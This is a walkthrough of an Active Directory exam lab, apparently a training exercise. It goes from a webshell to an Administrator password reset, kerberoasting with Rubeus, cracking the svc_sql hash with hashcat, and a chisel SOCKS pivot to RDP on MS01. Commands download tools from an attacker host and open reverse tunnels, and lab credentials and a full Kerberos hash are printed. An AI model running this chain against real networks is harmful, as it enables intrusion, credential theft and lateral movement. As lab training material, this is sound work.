# AD Exam part 1
We were left with a webshell. We can login using these credentials `admin:My_W3bsH3ll_P@ssw0rd!`

Goto `https://www.revshells.com/` and get a revershell shell to your attack box.
Reset the Administrator password using following command:
```
Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString "NewP@ssw0rd!" -AsPlainText -Force)
```
Now from the attack box we can login using the following command using winRM:
```
evil-winrm -i 10.129.21.224 -u Administrator -p NewP@ssw0rd!
```

Spin up an http server on the attack box to download `Rubeus.exe` on the target.
```
wget http://10.10.14.94:8000/Rubeus.exe -OutFile Rubeus.exe -UseBasicParsing
```

Then to kerberoast execute following commands:
```
cd C:/temp
./Rubeus.exe kerberoast /nowrap
```

We were requested to kerberoast the `MSSQLSvc/SQL01.inlanefreight.local:1433` account. We find the following hash we can attempt to crack:
```
[*] SamAccountName         : svc_sql
[*] DistinguishedName      : CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : MSSQLSvc/SQL01.inlanefreight.local:1433
[*] PwdLastSet             : 3/30/2022 2:14:52 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433@INLANEFREIGHT.LOCAL*$4179975E7DFA2FD7D936B70221D75C32$583149CF953063DF2970687C50CA69359BF6002CA644D91FA85EBCC4E663125688E6CD375EC876405D9E2EBADC0DDE2352E1437E50888BB10EAB9C6A2C63F789BA6894184C56061F96EE14919BF677C2AD697253EB795F7B710EBAD3675D16A35E220F72112036A8AF9F93D4A750940765C800E66B48C9B151A864A1FDBD7E9C147026B71B0091FF8A2880C26B2ACC1E9AC7E9EF6F39B398A46759FB0E851929CC7CEADB28938382C138D276E068990AE14525ABF4C19FFE7C7119C53381C108F2822ABA612C03D767E8DEB356E320377D5C50A6587EBBB2B3BCA39A30D6A3D507EEA5A4BA87422ADFFBCAF724FDC4289FB0785C46ECB36D00B1C3A192F60636C7EA1F8841F67DEA2CE99AD90984AC3036E1BFFEEC207B4E7D96A6A33CA7C293E03C11D78E80C2C296C082AD177E6D46FE25F4CE063F3FE9406B7B9C7F2C54ADCC6E05B4439E8206A41F54DAC47DA6BE85CCA878C66896A12C3AA6B1D22B38C40B62CCA39F7612A78772746310F227687CF0533ED1F04DF40750A4B4F48D466AC34B04BD8123820854DC3087E97CBA16FC6BCC2EC87B4897E155C3D088F0E30D003CFEA8AF3E1856A89D637D6ECEE875AED4D93476267071534EF8DD6D7E313C0E2CDFE267713E0DEDF3564FE8037628FB8F41D8072166E59903202340CB8B94C686486B6C9F7647B35E254F2C7314FF0376CB5219F6FFFC1A2B47D50800AEB427C1D06493D61C2A755E8E08BD130E3FC9D44DF8714B8BB1917B6A666728E9449622557A6713E728A7DD9562B03C832F67A895502ADDBCABF67ADA986D33C63A17FA700F4378733DB79A9A9420E0D5CD0F927B97AF27807C85AB3D4A74F263C5519B3AE546A21E116FC78F6EA7A86D416C0202F9B0A3B530A67A937C65C2ECBA33EC7CEA841BE6202FEFF34CA0AF7FB5798897D6547EE20CB236281A6F29B621C71509BEA7105509D9E131CAD994B65BD9AF349285AB15EB6F6D8601B377ED317FBB9D6031CA32524DABEA0E6FB438302D1D46F8EE4973F4BA876BAC36CFF477B566C4E7F580340E4B665C706621329191B4FD16D46670E3FA562A4E6B36BBE5D038C38E6CD831CDE5B942D44B423C0A85BECE33F48D67D54364C136BDB1770E8FBC227379A8582F90827E73B71C37CEB15BAAA406627C5ECAD3689D214F2EFCE48D91A2355566DB0F99206B79A04143489C03D83C96E6118F6FCF7AE08D151E3E4F0A44BEC755CD8A9E4ADC61826C95780D64971CD0398142D59AA4F244F2A5994EE82F452DCD5680914A25A9D4DB3AAA3BA01B57BCF7FC473867AD748642CE62539A43E73A2D436A69D44B7345100DE7F82D526E852FD7D0DC84BA26D4EDA500BDC709CD5BDC7599261C74B1FF08742D6D623DE6ADADD6C9E64428D2E7DD5D926FB687180933D6951B8D5ED3464EB6D7353EA3E99C8CAA341F850EEA116A86D5B6E2B1B9166A418BFCB2A4ED77CFBDDEE25B35DE8B60330D628E60E378B184BCB9B3E86758E86F805B193C891F323789BA72BB37D8CE6A
```
Let's attemt to crack the hash with hashcat:
```
hashcat -m 13100 hash.txt rockyou.txt
hashcat hash.txt --show
```

We successfully cracked the hash of this account, the credentials are:
```
MSSQLSvc/SQL01.inlanefreight.local:1433:lucky7
```

Now we want to pivot to box `MS01` with ip address `172.16.6.50`... Let's get `chisel` on the pivot by executing:
```
wget http://10.10.14.94:8000/chisel.exe -OutFile chisel.exe -UseBasicParsing
```

Setup chisel to pivot:
```
#Creates a socks proxy accessible on the attack machine (server) on port 1080
./chisel server -v -p 1234 --socks5 --reverse #Attack box
./chisel client -v 10.10.14.94:1234 R:1080:socks #Pivot
```

Now let's try connecting via rdp from the attack box
```
proxychains xfreerdp /v:172.16.6.50 /u:svc_sql /p:lucky7
```
